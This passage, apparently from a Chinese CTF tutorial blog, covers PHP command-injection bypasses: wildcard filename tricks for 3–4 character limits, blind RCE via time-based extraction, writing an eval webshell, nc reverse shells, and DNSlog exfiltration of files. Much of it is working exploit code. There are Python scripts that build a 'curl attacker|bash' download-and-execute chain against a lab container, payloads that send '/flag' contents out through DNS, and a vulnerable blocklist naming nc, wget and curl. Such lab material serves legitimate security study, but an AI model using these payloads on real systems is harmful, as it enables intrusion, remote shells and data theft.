class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;id</span><br><span class="line">&gt;root</span><br><span class="line">*           （等同于命令：id root）</span><br></pre></td></tr></table></figure><p>2.dir:虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p><p>先看下ls的效果，写到a时每个文件名都是单独一行，这样会影响命令执行</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce58e6d.png" alt="image-20240401090301990"></p><p>看下dir的效果，会不换行输出到文件中去</p><p><img src="https://bu.dusays.com/2024/05/13/664161cda6859.png" alt="image-20240401090338004"></p><p>3.rev:可以反转文件每一行的内容。</p><p>4.增加字母来限定被用来当作命令和参数的文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls</span><br><span class="line">&gt;lss</span><br><span class="line">&gt;lsss</span><br><span class="line">&gt;1</span><br><span class="line">*s       (等同于命令： ls lss lsss)</span><br></pre></td></tr></table></figure><p>5.通过增加ls的-h（把文件大小显示成1k 1M 等形式）参数来让调整-t（根据时间排序）参数的位置<br>我们之后需要用到rev 倒置输出</p><p>所以需要列出这样形式的文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&gt;  t-  sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd8ee61.png" alt="image-20240401090117318"></p><p>所以要增加-h来把-t往前拉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd95c36.png" alt="image-20240401090153203"></p><p>所以</p><p>因为是四个字符，所以 ls&gt;&gt;? 肯定是不能用了。</p><p>看一下构造：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure><p>发现dir排在最前面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure><p>*&gt;v 表示 执行 dir 并输出到 v 中</p><p>v&gt;x 很巧妙，这里这里目录下这么多文件，只有 rev 能执行成功（rev v&gt;x）</p><p>最后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0        (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)</span><br><span class="line">sh 0        (sh执行0里面的内容)</span><br></pre></td></tr></table></figure><h4 id="法2-2"><a href="#法2-2" class="headerlink" title="法2"></a>法2</h4><p>反弹</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启http服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是25秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题,或退出并重启改docker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/4/ffff.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件g</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;g\;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;g\&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*v&gt;x&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># list2本质上执行命令: curl 192.168.40.146|bash</span></span><br><span class="line"><span class="comment"># 注意根据情况修改攻击机IP</span></span><br><span class="line">list2= [</span><br><span class="line">    <span class="string">&quot;&gt;ash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;b\\&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;6\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;14\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;0.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;4\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;8.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;16\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;19\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh x&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh g&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf4b5d1.png" alt="image-20240401090817745"></p><h3 id="3字符下可控"><a href="#3字符下可控" class="headerlink" title="3字符下可控"></a>3字符下可控</h3><p>CTFSHOW平台的【nl】难了 一题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只限3个字符的shell_exec，依然利用通配符 * 表示将ls下面的文件执行，如果第一个是命令就直接执行命令，后面的当参数，与前几点的原理类似</p><p>首先ls查看当前目录下有哪些文件  ?1&#x3D;ls</p><p>只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。</p><p>payload:<code>?1=&gt;nl ?1=*或?1=*&gt;z 第二种：?1=&gt;od ?1=*</code></p><p>接下来再传入?&#x3D;*的时候就会在源代码中得到flag。</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适</p><h3 id="法1-3"><a href="#法1-3" class="headerlink" title="法1"></a>法1</h3><p>时间盲注</p><p>逻辑和SQL注入的时间盲注差不多</p><p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p><p>2.awk：逐行获取数据</p><p><code>cat test.php | awk NR==2               //awk NR==2 逐行获取一行字符</code></p><p>3.cut -c<br>cut命令逐列获取单个字符<br><code>cat flag | awk NR==2  | cut -c 1      #获取第一个字符 cat flag | awk NR==2  | cut -c 2      #获取第二个字符</code></p><p>4、if语句：判断命令是否执行<br>if [ $(cat flag | awk NR&#x3D;&#x3D;2 | cut -c 1) &#x3D;&#x3D; F ];then sleep 2;fi<br>if里的判断语句为真的话，则执行sleep 2，休眠2秒后返回结果 </p><p><img src="https://bu.dusays.com/2024/05/13/664161ce84d2d.png" alt="image-20240401093435071"></p><p>直接脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">环境搭建: 靶机:kali 192.168.40.148</span></span><br><span class="line"><span class="string">拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">退出并关闭docker:exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># url=input(&quot;请输入URL:,例如:http://192.168.40.148:18080/class08/1.php?cmd=&quot;)</span></span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;URL样式:http://192.168.40.148:18080/class08/1.php?cmd=\n请输入URL:&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">55</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url + payload, timeout=(<span class="number">1.5</span>, <span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&quot;http://192.168.1.6:19080/class08/1.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>): //定义i、j、k三个变量</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  </span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  //<span class="built_in">ascii</span>码表</span><br><span class="line">            k=<span class="built_in">chr</span>(k)  //把<span class="built_in">ascii</span>码转换成字母，HEX编码变成字符</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)  //i定义读取<span class="number">1</span>-<span class="number">5</span>行，i定义读取<span class="number">1</span>-<span class="number">55</span>个字符</span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if[ `ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>`==<span class="subst">&#123;k&#125;</span>];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k   //把值加入result，<span class="built_in">print</span>输出显示</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>两个脚本差不多</p><p><img src="https://bu.dusays.com/2024/05/13/664161d0d0b65.png" alt="image-20240401092849763"></p><h3 id="法2-3"><a href="#法2-3" class="headerlink" title="法2"></a>法2</h3><p>文件读写</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | tee abc</span><br></pre></td></tr></table></figure><p><code>tee</code>命令用于从标准输入读取数据，并将其写入一个或多个文件 tee的作用是把查询到的根目录写入到当前网页下的某文件 再次访问该文件即可得到被打印的根目录</p><p><code>tee</code>通常后面会跟着要写入的文件名</p><p>先执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ls| tee abc # 将ls的结果重定向到文件名为abc的文件中</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ce6fe16.png" alt="image-20240401094832958"></p><p>还可以：</p><p>重定向符 :</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=echo &quot;&lt;?php show_source(__FILE__);@eval(\$_POST[&#x27;s&#x27;]); ?&gt;&quot; &gt; a.php</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cfd7e0d.png" alt="image-20240401095308316"></p><p>再访问a.php</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdd1ee9.png" alt="image-20240401095338301"></p><p>然后就随便打了</p><h3 id="法3-1"><a href="#法3-1" class="headerlink" title="法3"></a>法3</h3><p>反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p><p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce5cdba.png" alt="image-20240401211530764"></p><p><img src="https://bu.dusays.com/2024/05/13/664161d08ca11.png" alt="image-20240401211556638"></p><p>可以看到已经反弹成功了，拿到了根目录下的flag</p><h3 id="法4"><a href="#法4" class="headerlink" title="法4"></a>法4</h3><p>dnslog外带数据法</p><p><strong>DNS（域名解析）：</strong></p><blockquote><p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p></blockquote><p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p><blockquote><p>DNSLOG平台 </p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p><p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p><p><a href="http://ceye.io/">http://ceye.io</a> （要注册）</p></blockquote><p>也可以使用yakit的DNSLog:</p><p><img src="https://bu.dusays.com/2024/05/13/664161cee4e55.png" alt="image-20240401212510959"></p><p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce6c83e.png" alt="image-20240401212125289"></p><p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd6cf42.png" alt="image-20240401212157348"></p><p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdafb7e.png" alt="image-20240401212217281"></p><p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf9bdab.png" alt="image-20240401212241190"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `ls|sed -n &#x27;1p&#x27;`.pmdbhelcqt.dgrh3.cn # 通过控制多少p,就可以看到ls出的第多少个文件名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `cat /flag`.pmdbhelcqt.dgrh3.cn</span><br></pre></td></tr></table></figure><p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce7b2e9.png" alt="image-20240401212313639"></p><p><img src="https://bu.dusays.com/2024/05/13/664161ce45caa.png" alt="image-20240401212332680"></p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果</p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，<strong>它只能匹配和替换嵌套的函数调用，而不能处理函数参数</strong>。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，<strong>无参数rce就是不使用参数，而只使用一个个函数最终达到目的</strong>。</p></blockquote><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>无参数rce可能用到的函数:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">array_reverse() -逆转数组</span><br><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。</span><br><span class="line">array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，                         array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完               成后，就可以根据随机的键获取数组的随机值。</span><br><span class="line"> array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键函数：</span><br><span class="line">getenv() ：获取环境变量的值  </span><br><span class="line">           php7.0以下返回bool(false)</span><br><span class="line">           php7.0以上正常回显</span><br><span class="line">           payload:</span><br><span class="line">           ?code=var_dump(getenv());</span><br><span class="line">           ?code=var_dump(getenv(phpinfo()));</span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">getallheaders()：获取所有 HTTP 请求标头，是apache_request_headers()的别名函                    数，但是该函数只能在Apache环境下使用</span><br><span class="line"></span><br><span class="line">                  payload:</span><br><span class="line">                  1) GET /1.php?code=eval(end(getallheaders()));                              HTTP/1.1</span><br><span class="line">                     .....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);</span><br><span class="line">                  2) GET /1.php?exp=eval(end(apache_request_headers()));                      HTTP/1.1</span><br><span class="line">                     ....</span><br><span class="line">                     flag: system(&#x27;id&#x27;);      php7以上</span><br><span class="line">                    </span><br><span class="line">                     </span><br><span class="line">                     </span><br><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组，会返回$_GET</span><br><span class="line">                   ,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-                       &gt;post-&gt;cookie-&gt;files</span><br><span class="line">           